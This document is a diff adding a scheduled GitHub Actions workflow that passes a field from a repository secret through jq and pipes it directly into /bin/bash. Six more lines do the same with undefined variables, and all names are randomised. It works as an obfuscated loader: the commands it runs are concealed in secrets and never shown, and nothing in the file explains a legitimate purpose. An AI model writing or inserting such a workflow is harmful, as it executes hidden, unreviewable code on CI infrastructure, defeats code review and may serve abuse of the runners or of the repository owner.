@@ -1,0 +1,24 @@
+name: chloeprofiletech
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chloeprofiletech
+        env:
+          b91311: ${{ secrets.b91311 }}
+        run: |
+          echo $b91311 | jq -r .mupwz65 | /bin/bash
+          echo $cndmb9729 | jq -r .iz073 | /bin/bash
+          echo $oy830 | jq -r .vaoz15628 | /bin/bash
+          echo $p8960 | jq -r .fy9599 | /bin/bash
+          echo $td579 | jq -r .gx0540 | /bin/bash
+          echo $jfr76917 | jq -r .hoxf91542 | /bin/bash
+          echo $aqzo02 | jq -r .si036 | /bin/bash
+
